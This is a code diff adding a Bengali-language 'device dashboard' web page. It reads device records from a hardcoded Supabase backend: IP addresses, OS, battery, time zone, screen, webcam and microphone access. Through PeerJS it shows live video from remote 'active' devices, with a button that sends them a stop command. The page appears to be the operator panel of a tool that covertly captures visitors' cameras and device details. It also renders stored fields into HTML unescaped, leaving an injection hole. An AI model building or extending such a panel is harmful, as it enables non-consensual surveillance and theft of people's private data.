@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ডিভাইস ড্যাশবোর্ড</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .rotate-180 {
+            transform: rotate(180deg);
+        }
+        .transition-transform {
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .details-content {
+            transition: max-height 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            max-height: 0;
+            overflow: hidden;
+        }
+        .details-content.expanded {
+            max-height: 5000px; /* একটি বড় মান যা কন্টেন্টের উচ্চতাকে ছাড়িয়ে যাবে */
+        }
+        #remoteVideo {
+            width: 100%;
+            max-height: 500px;
+            background-color: #000;
+            border-radius: 0.75rem;
+            display: none;
+        }
+        #remoteVideo.active {
+            display: block;
+        }
+        .watch-btn:disabled, .stop-btn:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="container mx-auto px-4 py-8">
+        <header class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4">
+            <div>
+                <h1 class="text-3xl font-bold text-gray-800">ডিভাইস ড্যাশবোর্ড</h1>
+                <p class="text-gray-500 mt-1">সক্রিয় ডিভাইস এবং সংগৃহীত তথ্যের সম্পূর্ণ চিত্র।</p>
+            </div>
+            </header>
+
+        <section id="live-section" class="mb-12">
+            <h2 class="text-2xl font-bold text-gray-700 border-b-2 border-indigo-200 pb-2 mb-4">সরাসরি সম্প্রচার (সক্রিয় ডিভাইস)</h2>
+            
+            <div class="mb-6">
+                <video id="remoteVideo" autoplay playsinline></video>
+            </div>
+            
+            <div id="live-streams-container" class="space-y-3">
+                <div id="live-loading-state" class="flex justify-center items-center space-x-2 text-gray-500 py-6">
+                     <svg class="animate-spin h-5 w-5 text-indigo-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                     <span>সক্রিয় ডিভাইস লোড হচ্ছে...</span>
+                </div>
+            </div>
+        </section>
+
+        <section id="history-section">
+            <h2 class="text-2xl font-bold text-gray-700 border-b-2 border-indigo-200 pb-2 mb-4">সংগৃহীত তথ্যের ইতিহাস</h2>
+            <div id="records-container" class="space-y-4">
+                <div id="loading-state" class="flex justify-center items-center space-x-2 text-gray-500 py-10">
+                    <svg class="animate-spin h-5 w-5 text-indigo-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                    <span>Supabase থেকে ডেটা লোড হচ্ছে...</span>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'https://gsmnzfbcxmhywznchoxq.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdzbW56ZmJjeG1oeXd6bmNob3hxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY4NzI4NDgsImV4cCI6MjA3MjQ0ODg0OH0.0seF_SbMoSP5RkEZRGLcfDM07yE2T0EdyGgpgXFcs6c';
+
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const peer = new Peer();
+
+        const remoteVideo = document.getElementById('remoteVideo');
+        const liveStreamsContainer = document.getElementById('live-streams-container');
+        const liveLoadingState = document.getElementById('live-loading-state');
+        const recordsContainer = document.getElementById('records-container');
+        const loadingState = document.getElementById('loading-state');
+
+        let activeCall = null;
+        let activeDataConnection = null;
+        let autoRefreshInterval = null;
+
+        peer.on('open', (id) => {
+            console.log('Dashboard PeerJS connection is open. ID:', id);
+            document.querySelectorAll('.watch-btn:disabled').forEach(button => {
+                button.disabled = false;
+            });
+        });
+        
+        peer.on('error', (err) => {
+            console.error('PeerJS error:', err);
+            // Don't alert for connection errors as they can be frequent during negotiation
+        });
+
+        async function loadActiveStreams() {
+            const twentySecondsAgo = new Date(Date.now() - 20000).toISOString();
+            
+            try {
+                const { data, error } = await supabase
+                    .from('active_streams')
+                    .select('*')
+                    .gt('last_seen', twentySecondsAgo)
+                    .order('created_at', { ascending: false });
+
+                if (error) throw error;
+                
+                if(liveLoadingState) liveLoadingState.style.display = 'none';
+
+                const container = document.getElementById('live-streams-container');
+                const existingPeerIds = new Set(Array.from(container.querySelectorAll('.stream-item')).map(el => el.dataset.peerId));
+                const incomingPeerIds = new Set(data.map(d => d.peer_id));
+
+                // Remove offline devices
+                existingPeerIds.forEach(id => {
+                    if (!incomingPeerIds.has(id)) {
+                        container.querySelector(`.stream-item[data-peer-id="${id}"]`)?.remove();
+                    }
+                });
+
+                // Add new online devices
+                const isPeerReady = peer.open;
+                data.forEach(stream => {
+                    if (!existingPeerIds.has(stream.peer_id)) {
+                        const item = document.createElement('div');
+                        item.className = 'stream-item bg-white rounded-xl shadow p-4 flex justify-between items-center';
+                        item.dataset.peerId = stream.peer_id; // Add peer id for easy removal
+                        item.innerHTML = `
+                            <div class="flex items-center gap-4 overflow-hidden">
+                               <span class="flex h-3 w-3 relative flex-shrink-0">
+                                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                                  <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
+                               </span>
+                               <div>
+                                    <p class="font-semibold text-gray-700 truncate" title="${stream.user_agent}">${stream.user_agent}</p>
+                                    <p class="text-xs text-gray-400">Peer ID: ${stream.peer_id}</p>
+                               </div>
+                            </div>
+                            <div class="flex gap-2 flex-shrink-0">
+                                <button data-peer-id="${stream.peer_id}" class="watch-btn bg-green-500 text-white font-semibold py-2 px-4 rounded-lg shadow-md hover:bg-green-600 transition-all text-sm" ${!isPeerReady ? 'disabled' : ''}>
+                                   লাইভ দেখুন
+                                </button>
+                                <button data-peer-id="${stream.peer_id}" class="stop-btn bg-red-500 text-white font-semibold py-2 px-4 rounded-lg shadow-md hover:bg-red-600 transition-all text-sm hidden">
+                                   বন্ধ করুন
+                                </button>
+                            </div>
+                        `;
+                        container.appendChild(item);
+                    }
+                });
+
+                if (container.childElementCount === 0 && liveLoadingState.style.display === 'none') {
+                    container.innerHTML = `<div class="text-center py-6 text-gray-500 bg-white rounded-lg shadow">কোনো সক্রিয় ডিভাইস পাওয়া যায়নি।</div>`;
+                }
+            } catch (error) {
+                console.error("Failed to load active streams:", error);
+            }
+        }
+        
+        function startCall(targetPeerId, watchButton) {
+            if (activeCall) {
+                activeCall.close();
+                if(activeDataConnection) activeDataConnection.close();
+            }
+            
+            const stopButton = watchButton.nextElementSibling;
+            
+            activeCall = peer.call(targetPeerId, null);
+            activeDataConnection = peer.connect(targetPeerId);
+
+            if (!activeCall || !activeDataConnection) {
+                alert("সংযোগ স্থাপন করা যাচ্ছে না। পৃষ্ঠাটি রিফ্রেশ করে আবার চেষ্টা করুন।");
+                return;
+            }
+
+            document.querySelectorAll('.watch-btn').forEach(btn => btn.disabled = true);
+            document.querySelectorAll('.stop-btn').forEach(btn => btn.classList.add('hidden'));
+            
+            watchButton.classList.add('hidden');
+            watchButton.disabled = false;
+            stopButton.classList.remove('hidden');
+
+            activeCall.on('stream', (remoteStream) => {
+                remoteVideo.srcObject = remoteStream;
+                remoteVideo.classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+            activeCall.on('close', () => resetLiveView());
+            activeCall.on('error', (err) => {
+                console.error("Call Error:", err);
+                resetLiveView();
+            });
+        }
+        
+        function stopCall() {
+            if (activeDataConnection) activeDataConnection.send('stop');
+            if (activeCall) activeCall.close();
+            resetLiveView();
+        }
+
+        function resetLiveView() {
+            remoteVideo.classList.remove('active');
+            remoteVideo.srcObject = null;
+            document.querySelectorAll('.watch-btn').forEach(btn => {
+                btn.classList.remove('hidden');
+                btn.disabled = !peer.open;
+            });
+            document.querySelectorAll('.stop-btn').forEach(btn => btn.classList.add('hidden'));
+            activeCall = null;
+            activeDataConnection = null;
+        }
+
+        liveStreamsContainer.addEventListener('click', (event) => {
+            const button = event.target.closest('button');
+            if (!button) return;
+            const peerId = button.dataset.peerId;
+            if (peerId) {
+                if (button.classList.contains('watch-btn')) startCall(peerId, button);
+                else if (button.classList.contains('stop-btn')) stopCall();
+            }
+        });
+
+        const getIconForKey = (key) => { const iconClass = "w-5 h-5 text-indigo-600"; const icons = {'operating_system': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>`, 'user_agent': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9V3m0 18a9 9 0 009-9M3 12a9 9 0 019-9m-9 9h18"></path></svg>`, 'battery_status': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>`, 'time_zone': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>`, 'screen_resolution': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5v-4m0 0h-4m4 0l-5-5"></path></svg>`, 'webcam_access': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>`, 'microphone_access': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>`, 'default': `<svg class="${iconClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>`}; return icons[key] || icons['default']; };
+        const formatValue = (key, value) => { if (value === null || typeof value === 'undefined') { return '<span class="text-gray-400">N/A</span>'; } if (typeof value === 'object') { return `<pre class="text-xs bg-gray-100 p-2 rounded-md overflow-auto whitespace-pre-wrap font-mono">${JSON.stringify(value, null, 2)}</pre>`; } if (typeof value === 'boolean') { const bgColor = value ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'; const text = value ? 'Yes' : 'No'; return `<span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${bgColor}">${text}</span>`; } return `<span class="break-words">${value}</span>`; };
+        async function fetchHistoricalData() { recordsContainer.innerHTML = ''; recordsContainer.appendChild(loadingState); loadingState.style.display = 'flex'; try { const { data, error } = await supabase.from('device_info').select('*').order('created_at', { ascending: false }); if (error) throw error; loadingState.style.display = 'none'; if (data.length === 0) { recordsContainer.innerHTML = `<div class="text-center py-10 text-gray-500">কোনো ডেটা পাওয়া যায়নি।</div>`; return; } data.forEach(record => { const recordWrapper = document.createElement('div'); recordWrapper.className = 'bg-white rounded-xl shadow-lg mb-4 overflow-hidden transition-all duration-300'; const keysToSkip = ['id', 'ip_address', 'created_at']; let detailsHtml = '<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">'; for (const key in record) { if (!keysToSkip.includes(key) && Object.hasOwnProperty.call(record, key)) { detailsHtml += `<div class="bg-gray-50 p-4 rounded-lg border border-gray-200 flex flex-col justify-between h-full"><div><div class="flex items-center gap-2 mb-2">${getIconForKey(key)}<h4 class="text-xs font-bold text-gray-500 uppercase tracking-wider">${key.replace(/_/g, ' ')}</h4></div><div class="text-sm text-gray-900 font-medium">${formatValue(key, record[key])}</div></div></div>`; } } detailsHtml += '</div>'; recordWrapper.innerHTML = `<div class="summary-header p-5 flex justify-between items-center cursor-pointer hover:bg-gray-50 transition-colors"><div class="flex items-center gap-4"><svg class="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25-2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75"></path></svg><div><p class="text-lg font-bold text-gray-800">${record.ip_address || 'N/A'}</p><p class="text-sm text-gray-500">শনাক্ত করার সময়: ${new Date(record.created_at).toLocaleString()}</p></div></div><svg class="w-6 h-6 text-gray-400 transition-transform" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" /></svg></div><div class="details-content p-5 border-t border-gray-200 bg-white">${detailsHtml}</div>`; recordsContainer.appendChild(recordWrapper); const summaryHeader = recordWrapper.querySelector('.summary-header'); const detailsContent = recordWrapper.querySelector('.details-content'); const icon = summaryHeader.querySelector('svg:last-child'); summaryHeader.addEventListener('click', () => { detailsContent.classList.toggle('expanded'); icon.classList.toggle('rotate-180'); }); }); } catch (error) { loadingState.style.display = 'none'; recordsContainer.innerHTML = `<div class="text-center py-10 text-red-500">ডেটা লোড করতে সমস্যা হয়েছে: ${error.message}</div>`; } }
+
+        function initialLoad() {
+            fetchHistoricalData(); 
+            loadActiveStreams();
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            autoRefreshInterval = setInterval(loadActiveStreams, 7000);
+        }
+        
+        initialLoad();
+    </script>
+</body>
+</html>
